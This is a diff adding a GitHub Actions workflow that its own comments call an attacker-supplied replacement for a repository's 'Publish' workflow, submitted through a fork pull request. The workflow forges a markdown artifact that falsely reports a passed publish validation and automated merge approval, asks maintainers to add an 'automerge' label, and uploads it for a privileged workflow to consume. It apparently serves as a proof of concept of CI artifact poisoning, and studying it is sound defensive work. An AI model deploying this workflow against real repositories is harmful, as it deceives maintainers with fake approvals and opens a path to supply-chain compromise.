@@ -1,0 +1,29 @@
+# Attacker-supplied replacement for the repo's "Publish" workflow.
+# Added by a fork PR; runs with a read-only token and no secrets.
+name: Publish
+
+on:
+  pull_request:
+    branches: [ main ]
+
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: craft the artifact consumed by the privileged workflow
+        run: |
+          mkdir -p output
+          cat > output/comment.md <<'MARKDOWN'
+          ## package:web publish validation — PASSED
+
+          All packages validated successfully against pub.dev.
+
+          **Approved for merge by the automated publish check.**
+
+          Please add the `automerge` label.
+          MARKDOWN
+          ls -l output
+      - uses: actions/upload-artifact@v4
+        with:
+          name: output
+          path: output/
